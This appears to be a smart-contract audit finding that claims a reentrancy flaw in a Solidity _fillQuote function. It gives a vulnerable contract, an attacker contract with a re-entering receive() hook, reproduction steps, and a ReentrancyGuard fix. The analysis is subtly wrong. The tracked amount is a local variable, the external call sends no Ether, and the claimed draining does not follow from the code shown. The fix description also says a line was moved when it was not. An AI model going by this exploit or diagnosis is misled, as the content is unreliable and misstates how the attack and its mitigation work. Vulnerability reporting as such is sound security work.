# Vulnerability details

##Impact

The reentrancy vulnerability in the _fillQuote function can lead to a complete draining of the contract’s Ether balance. An attacker can exploit this vulnerability by repeatedly calling back into the _fillQuote function before the internal state (boughtETHAmount) is updated. This can result in the attacker receiving more Ether than intended, effectively stealing funds from the contract.


##Proof of Concept

The PoC consists of two contracts: a VulnerableContract containing the vulnerable _fillQuote function, and a MaliciousContract that exploits the reentrancy vulnerability.



##VulnerableContract.sol##

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract VulnerableContract {
    address public exchangeProxy;

    error SwapCallFailed();

    event SwappedTokens(address tokenAddress, uint256 soldAmount, uint256 boughtAmount);

    function _fillQuote(IERC20 _sellToken, uint256 _amount, bytes calldata _swapCallData) external {
        uint256 boughtETHAmount = address(this).balance;
        require(_sellToken.approve(exchangeProxy, _amount));
        (bool success, ) = payable(exchangeProxy).call{value: 0}(_swapCallData);
        boughtETHAmount = address(this).balance - boughtETHAmount;
        if (!success) {
            revert SwapCallFailed();
        }
        emit SwappedTokens(address(_sellToken), _amount, boughtETHAmount);
    }
}




##MaliciousContract.sol##

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./VulnerableContract.sol";

contract MaliciousContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    receive() external payable {
        vulnerableContract._fillQuote(IERC20(address(0)), 1, "");
    }

    function attack(IERC20 _sellToken, uint256 _amount, bytes calldata _swapCallData) external {
        vulnerableContract._fillQuote(_sellToken, _amount, _swapCallData);
    }
}



To reproduce the vulnerability:

    - Deploy the VulnerableContract and obtain its contract address.
    - Deploy the MaliciousContract, passing the address of the VulnerableContract to its constructor.
    - Call the attack function on the MaliciousContract, passing in the necessary parameters (_sellToken, _amount, and _swapCallData).
    - Observe the Ether balance of the VulnerableContract and the MaliciousContract.

You should see the Ether balance of the VulnerableContract being drained and transferred to the MaliciousContract.


#Recommended Mitigation Steps

To mitigate the reentrancy vulnerability in the _fillQuote function, the following steps are recommended:

   -  Checks-Effects-Interactions Pattern: Perform all state updates (in this case, updating boughtETHAmount) before interacting with external contracts.
   -  Reentrancy Guard: Use a reentrancy guard, such as the nonReentrant modifier from OpenZeppelin’s ReentrancyGuard contract, to prevent reentrancy attacks.

Here’s an example of how the _fillQuote function can be modified to prevent reentrancy attacks:

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract VulnerableContract is ReentrancyGuard {
    // ... (existing code)

    function _fillQuote(IERC20 _sellToken, uint256 _amount, bytes calldata _swapCallData) external nonReentrant {
        uint256 boughtETHAmount = address(this).balance;
        require(_sellToken.approve(exchangeProxy, _amount));
        (bool success, ) = payable(exchangeProxy).call{value: 0}(_swapCallData);
        boughtETHAmount = address(this).balance - boughtETHAmount;
        if (!success) {
            revert SwapCallFailed();
        }
        emit SwappedTokens(address(_sellToken), _amount, boughtETHAmount);
    }
}

In this modified version:

    - The VulnerableContract inherits from OpenZeppelin’s ReentrancyGuard contract.
    - The _fillQuote function is marked with the nonReentrant modifier, which prevents reentrancy attacks by locking the function during execution and unlocking it after completion.
    - The boughtETHAmount calculation is moved to after the payable(exchangeProxy).call{value: 0}(_swapCallData) line, ensuring that the state is updated before interacting with external contracts.
